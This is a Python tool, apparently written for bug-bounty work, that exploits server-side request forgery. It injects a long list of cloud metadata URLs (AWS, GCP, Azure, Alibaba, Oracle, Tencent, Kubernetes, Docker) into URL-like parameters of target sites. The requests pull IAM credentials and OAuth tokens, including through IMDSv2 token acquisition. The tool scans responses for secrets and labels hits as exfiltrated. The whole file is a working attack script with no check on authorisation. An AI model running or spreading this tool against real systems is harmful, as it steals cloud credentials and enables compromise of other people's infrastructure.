#!/usr/bin/env python3
"""Cloud Metadata Hunter — tests ALL cloud metadata endpoints against SSRF-vulnerable parameters.

Usage:
    python3 cloud_metadata_hunter.py --urls urls.txt --context .bb/context.json
    python3 cloud_metadata_hunter.py --urls urls.txt --context .bb/context.json --dry-run
"""
import argparse
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone


ALL_METADATA_ENDPOINTS = {
    "aws_imdsv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/placement/region",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/services/domain",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
        "http://instance-data.ec2.internal/latest/meta-data/",
        "http://instance-data/latest/meta-data/",
    ],
    "aws_imdsv2": [
        ("PUT", "http://169.254.169.254/latest/api/token", "X-aws-ec2-metadata-token-ttl-seconds:21600"),
    ],
    "aws_imdsv2_with_token": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=http://example.com",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://metadata.google.internal/computeMetadata/v1/instance/zone",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/0.1/meta-data/attributes/kube-env",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "gcp_compute": [
        "http://compute-metadata/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata/computeMetadata/v1/instance/id",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/interfaces/public/0/anchor_ipv4/gateway",
        "http://169.254.169.254/metadata/v1/user-data",
        "http://169.254.169.254/metadata/v1/floating_ip/ipv4/active",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "http://100.100.100.200/latest/meta-data/eipv4",
        "http://100.100.100.200/latest/meta-data/private-ipv4",
        "http://100.100.100.200/latest/meta-data/network-type",
        "http://100.100.100.200/latest/meta-data/region-id",
        "http://100.100.100.200/2016-01-01/meta-data/instance-id",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/opc/v2/instance/id",
        "http://169.254.169.254/opc/v2/instance/displayName",
        "http://169.254.169.254/opc/v2/instance/compartmentId",
        "http://169.254.169.254/opc/v2/instance/metadata/",
        "http://169.254.169.254/opc/v2/instance/regionInfo/realmKey",
        "http://169.254.169.254/opc/v2/vnics/",
        "http://169.254.169.254/opc/v2/instance/canRequest/",
    ],
    "ibm": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/metadata/v1/instance",
        "http://169.254.169.254/metadata/v1/instance/initialization",
        "http://169.254.169.254/metadata/v1/instance/compute",
    ],
    "openstack": [
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "http://169.254.169.254/openstack/latest/user_data",
        "http://169.254.169.254/openstack/latest/vendor_data.json",
        "http://169.254.169.254/2009-04-04/meta-data/",
        "http://169.254.169.254/latest/meta-data/",
    ],
    "tencent": [
        "http://metadata.tencentyun.com/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/instance-id",
        "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
        "http://metadata.tencentyun.com/latest/meta-data/local-ipv4",
        "http://metadata.tencentyun.com/latest/meta-data/public-ipv4",
        "http://metadata.tencentyun.com/latest/meta-data/placement/zone",
        "http://metadata.tencentyun.com/latest/meta-data/instance-name",
    ],
    "kubernetes": [
        "http://kubernetes.default.svc/",
        "http://169.254.169.254/api/v1/namespaces/default/pods/",
        "http://kubernetes.default.svc/api/v1/namespaces/default/services/",
    ],
    "docker": [
        "http://127.0.0.1:2375/containers/json",
        "http://127.0.0.1:2376/containers/json",
        "http://host.docker.internal:2375/containers/json",
        "http://docker:2375/containers/json",
    ],
}

PROVIDER_SIGNATURES = {
    "aws": [
        (r'"AccessKeyId"', 10),
        (r'"SecretAccessKey"', 10),
        (r'"Token"', 8),
        (r'\bami-id\b', 8),
        (r'\biam\/security-credentials\b', 9),
        (r'\bavailability-zone\b', 5),
        (r'\binstance-identity\/document\b', 7),
        (r'\b"accountId"\b', 6),
        (r'\b"imageId"\b', 6),
    ],
    "gcp": [
        (r'"access_token"', 10),
        (r'"expires_in"', 10),
        (r'"token_type"', 8),
        (r'computeMetadata', 9),
        (r'service-accounts\/default', 8),
        (r'\bproject-id\b', 5),
        (r'\b"email"', 4),
    ],
    "azure": [
        (r'\bazEnvironment\b', 10),
        (r'\bcompute\/(vmId|location|name)\b', 9),
        (r'\bnetwork\/interface\b', 7),
        (r'\boauth2\/token\b', 8),
        (r'api-version=(20|202)', 6),
        (r'/metadata/instance\?', 5),
    ],
    "digitalocean": [
        (r'"droplet_id"', 10),
        (r'"hostname"', 8),
        (r'"region"', 7),
        (r'"interfaces"', 6),
        (r'"public_keys"', 5),
    ],
    "alibaba": [
        (r'\b100\.100\.100\.200\b', 8),
        (r'\bram\/security-credentials\b', 10),
        (r'\beipv4\b', 7),
        (r'\binstance-id\b', 6),
        (r'\bregion-id\b', 5),
    ],
    "oracle": [
        (r'\bopc\/v2\b', 10),
        (r'\b"displayName"', 8),
        (r'\b"compartmentId"', 8),
        (r'\b"availabilityDomain"', 7),
        (r'\bvnics\b', 6),
    ],
    "ibm": [
        (r'\bibm cloud\b', 9, re.I),
        (r'\/metadata\/v1\/instance', 10),
        (r'\binstance_initialization\b', 7),
    ],
    "openstack": [
        (r'\bopenstack\b', 9, re.I),
        (r'\b"uuid"', 8),
        (r'\b"public_keys"', 7),
        (r'\bmeta_data\.json\b', 10),
    ],
    "tencent": [
        (r'\bmetadata\.tencentyun\.com\b', 10),
        (r'\bcam\/security-credentials\b', 8),
        (r'\bplacement\/zone\b', 6),
        (r'\binstance-name\b', 5),
    ],
}

SENSITIVE_PATTERNS = [
    (r'-----BEGIN\s+(RSA|EC|OPENSSH|PGP|DSA)\s+PRIVATE\s+KEY', "private_key"),
    (r'A(?:KIA|SIA|IDA|ROA|LAA)[A-Z0-9]{16}', "aws_access_key"),
    (r'ya29\.[0-9A-Za-z\-_]+', "google_oauth_token"),
    (r'sk-[a-zA-Z0-9]{24,}', "stripe_key"),
    (r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36}', "github_token"),
]

URL_PARAM_PATTERNS = [
    re.compile(r'[?&]([uU][rR][lL]|[uU][rR][iI]|[lL][iI][nN][kK]|[hH][rR][eE][fF]|[sS][rR][cC]|[sS][oO][uU][rR][cC][eE]|[dD][eE][sS][tT]|[dD][eE][sS][tT][iI][nN][aA][tT][iI][oO][nN]|[rR][eE][dD][iI][rR][eE][cC][tT]|[rR][eE][tT][uU][rR][nN]|[cC][aA][lL][lL][bB][aA][cC][kK]|[nN][eE][xX][tT]|[fF][oO][rR][wW][aA][rR][dD]|[pP][rR][oO][xX][yY]|[fF][eE][tT][cC][hH]|[lL][oO][aA][dD]|[tT][aA][rR][gG][eE][tT])=', re.I),
]


def load_context(ctx_path):
    if not ctx_path or not os.path.exists(ctx_path):
        return {}
    try:
        with open(ctx_path) as f:
            return json.load(f)
    except Exception:
        return {}


def load_urls(urls_file):
    if not urls_file or not os.path.exists(urls_file):
        return []
    with open(urls_file) as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]


def extract_url_params(url):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    results = []
    for key, values in qs.items():
        for pattern in URL_PARAM_PATTERNS:
            if pattern.search(f"{key}="):
                for val in values:
                    results.append((url, key, val))
                break
    return results


def make_ssrf_request(base_url, param_name, payload_value, method="GET", extra_headers=None, timeout=15):
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param_name] = [payload_value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; CloudMetadataHunter/2.0)",
    }
    if extra_headers:
        headers.update(extra_headers)

    try:
        http_ctx = ssl.create_default_context()
        http_ctx.check_hostname = False
        http_ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(test_url, headers=headers, method=method)
        resp = urllib.request.urlopen(req, timeout=timeout, context=http_ctx)
        body = resp.read()
        return {
            "status": resp.status,
            "body": body.decode("utf-8", errors="replace"),
            "body_len": len(body),
            "url": test_url,
            "headers": dict(resp.headers),
        }
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return {
            "status": e.code,
            "body": body.decode("utf-8", errors="replace") if body else "",
            "body_len": len(body) if body else 0,
            "url": test_url,
            "headers": dict(e.headers) if hasattr(e, 'headers') else {},
        }
    except Exception as e:
        return {"status": 0, "body": "", "body_len": 0, "url": test_url, "error": str(e), "headers": {}}


def score_provider(body):
    scores = {}
    for provider, sigs in PROVIDER_SIGNATURES.items():
        total = 0
        matches = []
        for pattern, weight, *flags in sigs:
            kwargs = {}
            if flags:
                kwargs = {"flags": flags[0]}
            if re.search(pattern, body, **kwargs):
                total += weight
                matches.append(pattern)
        if total > 0:
            scores[provider] = {"score": total, "matches": matches}
    return scores


def detect_sensitive_artifacts(body):
    found = []
    for pattern, name in SENSITIVE_PATTERNS:
        if re.search(pattern, body):
            found.append({"name": name, "pattern": pattern})
    return found


def hunt_metadata(url, param, timeout, token_storage=None):
    findings = []
    tokens = {}

    # AWS IMDSv2 token acquisition first
    for provider, endpoints in ALL_METADATA_ENDPOINTS.items():
        if provider == "aws_imdsv2":
            for method, ep, header_line in endpoints:
                key, val = header_line.split(":", 1)
                sys.stderr.write(f"  [aws-v2] acquiring token via {method} {ep}\n")
                result = make_ssrf_request(url, param, ep, method=method, extra_headers={key.strip(): val.strip()}, timeout=timeout)
                if result.get("status") == 200 and result.get("body_len", 0) > 0:
                    tokens["aws_imdsv2"] = result.get("body", "").strip()
                    sys.stderr.write(f"  [aws-v2] got IMDSv2 token: {tokens['aws_imdsv2'][:20]}...\n")
                    finding = {
                        "category": "cloud_metadata",
                        "provider": "aws",
                        "imds_version": "v2",
                        "endpoint": ep,
                        "payload": ep,
                        "status": result.get("status"),
                        "body_len": result.get("body_len"),
                        "finding": "CLOUD_METADATA_TOKEN_ACQUIRED",
                        "severity": "high",
                        "evidence": f"IMDSv2 token acquired ({len(tokens['aws_imdsv2'])} bytes)",
                        "url": result.get("url"),
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }
                    findings.append(finding)
                time.sleep(0.2)

    # Hunt all metadata endpoints
    total_endpoints = sum(len(v) for v in ALL_METADATA_ENDPOINTS.values())
    tested = 0

    for provider, endpoints in ALL_METADATA_ENDPOINTS.items():
        for ep in endpoints:
            tested += 1
            method = "GET"
            extra_headers = {}

            if isinstance(ep, tuple):
                method, ep, *_ = ep

            if "gcp" in provider and "metadata.google.internal" in str(ep):
                extra_headers["Metadata-Flavor"] = "Google"
            if "azure" in provider:
                extra_headers["Metadata"] = "true"

            if "aws_imdsv2_with_token" in provider and "aws_imdsv2" in tokens:
                extra_headers["X-aws-ec2-metadata-token"] = tokens["aws_imdsv2"]

            sys.stderr.write(f"  [{tested}/{total_endpoints}] {provider}: {ep[:80]}\n")
            result = make_ssrf_request(url, param, str(ep), method=method, extra_headers=extra_headers, timeout=timeout)

            body = result.get("body", "")
            body_len = result.get("body_len", 0)
            status = result.get("status", 0)

            finding = {
                "category": "cloud_metadata",
                "provider_group": provider,
                "endpoint": str(ep),
                "payload": str(ep),
                "status": status,
                "body_len": body_len,
                "url": result.get("url", ""),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "method": method,
            }

            # Score response
            provider_scores = score_provider(body)
            sensitive = detect_sensitive_artifacts(body)

            if status == 200 and (body_len > 50 or provider_scores or sensitive):
                top_provider = None
                if provider_scores:
                    top_provider = max(provider_scores, key=lambda k: provider_scores[k]["score"])
                    finding["detected_provider"] = top_provider
                    finding["provider_confidence"] = provider_scores[top_provider]["score"]
                    finding["all_scores"] = provider_scores

                if sensitive:
                    finding["sensitive_artifacts"] = sensitive

                finding["finding"] = "CLOUD_METADATA_EXFILTRATED"
                finding["severity"] = "critical"
                finding["response_preview"] = body[:500]
            elif status == 200 and body_len > 0:
                finding["finding"] = "RESPONSE_RECEIVED"
                finding["severity"] = "medium"
            elif status in (301, 302, 307, 308):
                finding["finding"] = "REDIRECT_TO_METADATA"
                finding["severity"] = "medium"
            elif status and (status // 100 != 4):
                finding["finding"] = "SSRF_CONNECTIVITY"
                finding["severity"] = "low"
            else:
                finding["finding"] = "no_response"
                finding["severity"] = "info"

            findings.append(finding)
            time.sleep(0.25)

    return findings


def main():
    ap = argparse.ArgumentParser(description="Cloud Metadata Hunter — test all cloud metadata endpoints via SSRF parameters")
    ap.add_argument("--urls", required=True, help="File containing URLs to probe (one per line)")
    ap.add_argument("--context", default=None, help="Path to .bb/context.json for session configuration")
    ap.add_argument("--output", default=None, help="Output JSONL file (default: findings.jsonl)")
    ap.add_argument("--dry-run", action="store_true", help="Preview endpoints without making requests")
    ap.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    ap.add_argument("--max-urls", type=int, default=50, help="Maximum number of URLs to test")
    args = ap.parse_args()

    context = load_context(args.context)
    outdir = context.get("OUTDIR", os.getcwd())
    output_file = args.output or os.path.join(outdir, "findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        sys.stderr.write(f"[ERROR] No URLs loaded from {args.urls}\n")
        sys.exit(1)
    urls = urls[:args.max_urls]

    sys.stderr.write(f"[*] Loaded {len(urls)} URLs from {args.urls}\n")

    all_param_urls = []
    for url in urls:
        params = extract_url_params(url)
        all_param_urls.extend(params)

    if not all_param_urls:
        sys.stderr.write("[!] No URL-like parameters found in provided URLs\n")
        sys.exit(0)

    total_endpoints = sum(len(v) for v in ALL_METADATA_ENDPOINTS.values())
    sys.stderr.write(f"[*] Found {len(all_param_urls)} URL-like parameter instances\n")
    sys.stderr.write(f"[*] Total cloud metadata endpoints: {total_endpoints}\n")

    if args.dry_run:
        sys.stderr.write("\n[DRY RUN] Cloud endpoints that would be tested:\n")
        for provider, endpoints in ALL_METADATA_ENDPOINTS.items():
            sys.stderr.write(f"  [{provider}]: {len(endpoints)} endpoints\n")
            for ep in endpoints[:3]:
                sys.stderr.write(f"    - {str(ep)[:100]}\n")
            if len(endpoints) > 3:
                sys.stderr.write(f"    ... and {len(endpoints) - 3} more\n")
        sys.stderr.write(f"\nWould test against {len(all_param_urls)} parameter instances\n")
        sys.stdout.write(json.dumps({"status": "dry_run", "providers": len(ALL_METADATA_ENDPOINTS), "total_endpoints": total_endpoints, "param_instances": len(all_param_urls)}))
        return

    all_findings = []

    for url, param, val in all_param_urls:
        sys.stderr.write(f"\n{'='*60}\n")
        sys.stderr.write(f"Hunting metadata via: {url[:100]}  param={param}\n")
        sys.stderr.write(f"{'='*60}\n")

        try:
            results = hunt_metadata(url, param, args.timeout)
            all_findings.extend(results)
        except Exception as e:
            sys.stderr.write(f"[ERROR] hunting metadata: {e}\n")

    os.makedirs(os.path.dirname(output_file) or ".", exist_ok=True)
    with open(output_file, "w") as f:
        for finding in all_findings:
            f.write(json.dumps(finding) + "\n")

    critical = [f for f in all_findings if f.get("severity") == "critical"]
    high = [f for f in all_findings if f.get("severity") == "high"]

    providers_seen = {}
    for f in all_findings:
        dp = f.get("detected_provider")
        if dp:
            providers_seen[dp] = providers_seen.get(dp, 0) + 1

    summary = {
        "total_probes": len(all_findings),
        "critical": len(critical),
        "high": len(high),
        "providers_detected": providers_seen,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    sys.stderr.write(f"\n[DONE] {len(all_findings)} probes: {len(critical)} critical, {len(high)} high\n")
    sys.stderr.write(f"[PROVIDERS DETECTED] {json.dumps(providers_seen)}\n")
    sys.stderr.write(f"[OUTPUT] -> {output_file}\n")

    sys.stdout.write(json.dumps(summary) + "\n")


if __name__ == "__main__":
    main()